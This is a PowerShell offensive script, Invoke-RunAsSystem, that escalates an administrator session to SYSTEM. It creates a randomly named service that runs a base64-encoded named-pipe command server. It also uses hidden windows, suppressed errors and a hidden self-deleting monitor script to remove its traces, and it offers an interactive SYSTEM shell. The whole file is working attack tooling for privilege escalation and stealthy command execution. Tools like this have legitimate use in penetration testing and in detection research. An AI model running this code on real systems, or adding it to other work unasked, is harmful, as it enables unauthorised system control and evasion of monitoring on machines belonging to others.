function Invoke-RunAsSystem {
	
	<#

	.SYNOPSIS
	Invoke-RunAsSystem Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-RunAsSystem

	.DESCRIPTION
	A simple script to elevate current session to SYSTEM (needs to be run as Administrator)
	
	.EXAMPLE
	Invoke-RunAsSystem
	
	#>

	param (
		[string]$Timeout = "30000",
		[string]$Command
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
	$randomvalue = $randomvalue -join ""
	$PipeName = $randomvalue
	
	$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
	$randomvalue = $randomvalue -join ""
	$ServiceName = "Service_" + $randomvalue
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	$arguments = "create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
	$startarguments = "start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
	Start-Sleep -Milliseconds 1000
	
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($ComputerName)]: Connection timed out"
		Write-Output ""
		return
	} catch {
		Write-Output "[$($ComputerName)]: An unexpected error occurred"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	if ($Command) {
		$Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
		$Command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | IEX"
		$fullCommand = "$Command 2>&1 | Out-String"
		$sw.WriteLine($fullCommand)
		$sw.Flush()
		while ($true) {
			$line = $sr.ReadLine()
			if ($line -eq "###END###") {
				Write-Output $serverOutput.Trim()
				Write-Output ""
				break
			} else {
				$serverOutput += "$line`n"
			}
		}
	}
	
	else{
	
		while ($true) {
			
			# Fetch the actual remote prompt
			$sw.WriteLine("prompt | Out-String")
			$sw.Flush()
			
			$remotePath = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					# Remove any extraneous whitespace, newlines etc.
					$remotePath = $remotePath.Trim()
					break
				} else {
					$remotePath += "$line`n"
				}
			}
			
			$promptString = "$remotePath "
			Write-Host -NoNewline $promptString
			$userCommand = Read-Host
			
			if ($userCommand -eq "exit") {
				Write-Output ""
					$sw.WriteLine("exit")
				$sw.Flush()
				break
			}
			
			elseif($userCommand -ne ""){
				$fullCommand = "$userCommand 2>&1 | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()
			}
			
			else{
				continue
			}
			
			#Write-Output ""

			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
				}
			}
		}
	}
	
	$stoparguments = "delete $ServiceName"
	Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
	$pipeClient.Close()
	$pipeClient.Dispose()
}